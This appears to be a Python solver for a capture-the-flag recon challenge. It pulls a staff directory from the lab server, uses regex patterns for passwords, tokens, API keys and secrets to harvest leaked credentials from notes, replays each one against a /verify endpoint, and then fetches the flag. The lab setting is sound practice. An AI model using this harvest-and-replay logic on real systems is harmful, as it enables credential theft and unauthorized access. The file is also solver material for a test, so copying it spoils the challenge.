"""Theseus's Trial I: Recon solver."""
from flag_utils import extract_flag
import requests
import re

class TheseusSolver:
    """Extract leaked credential from staff directory notes."""

    def __init__(self, agent):
        self.agent = agent
        self.base_url = agent.base_url

    def solve(self):
        """
        GET /directory to list staff, find leaked credential in notes,
        POST /verify to confirm it.
        """
        print("=== Theseus's Trial I: Recon ===", flush=True)

        try:
            # Get staff directory
            resp = requests.get(f"{self.base_url}/directory", timeout=10)
            print(f"Directory status: {resp.status_code}", flush=True)
            print(f"Response preview: {resp.text[:1000]}", flush=True)

            if resp.status_code != 200:
                print("Failed to fetch directory", flush=True)
                return None

            # Parse JSON response
            data = resp.json()

            # Look through notes for credentials
            # Common patterns: passwords, API keys, tokens
            credential_patterns = [
                r'password[:\s]+([^\s,]+)',
                r'passwd[:\s]+([^\s,]+)',
                r'pwd[:\s]+([^\s,]+)',
                r'token[:\s]+([^\s,]+)',
                r'api[_-]?key[:\s]+([^\s,]+)',
                r'secret[:\s]+([^\s,]+)',
                r'credential[:\s]+([^\s,]+)',
            ]

            candidates = []

            # Iterate through all entries
            if isinstance(data, list):
                entries = data
            elif isinstance(data, dict) and "entries" in data:
                entries = data["entries"]
            elif isinstance(data, dict) and "staff" in data:
                entries = data["staff"]
            else:
                entries = [data]

            for entry in entries:
                notes = entry.get("notes", "") or ""
                print(f"Checking notes: {notes[:100]}", flush=True)

                for pattern in credential_patterns:
                    matches = re.finditer(pattern, notes, re.IGNORECASE)
                    for match in matches:
                        cred = match.group(1).strip()
                        if cred and len(cred) > 5:  # reasonable credential length
                            candidates.append(cred)
                            print(f"Found candidate credential: {cred[:20]}...", flush=True)

                # Also look for anything that looks like a long random string
                words = notes.split()
                for word in words:
                    if len(word) > 15 and any(c.isdigit() for c in word) and any(c.isalpha() for c in word):
                        candidates.append(word)

            # Try verifying each candidate
            for cred in candidates:
                try:
                    verify_resp = requests.post(
                        f"{self.base_url}/verify",
                        json={"credential": cred},
                        timeout=10
                    )
                    print(f"Verify {cred[:20]}: {verify_resp.status_code}", flush=True)
                    print(f"  Response: {verify_resp.text[:300]}", flush=True)

                    # Look for flag in response
                    flag = extract_flag(verify_resp.text)
                    if flag:
                            return flag

                    # Also check for success indicators
                    if verify_resp.status_code == 200 and "success" in verify_resp.text.lower():
                        # Might need to fetch flag from another endpoint
                        for endpoint in ["/flag", "/secret"]:
                            flag_resp = requests.get(f"{self.base_url}{endpoint}", timeout=10)
                            flag = extract_flag(flag_resp.text)
                            if flag:
                                    return flag
                except Exception as e:
                    print(f"  Verify error: {e}", flush=True)

        except Exception as e:
            print(f"Error: {e}", flush=True)

        print("Failed to extract flag from directory", flush=True)
        return None
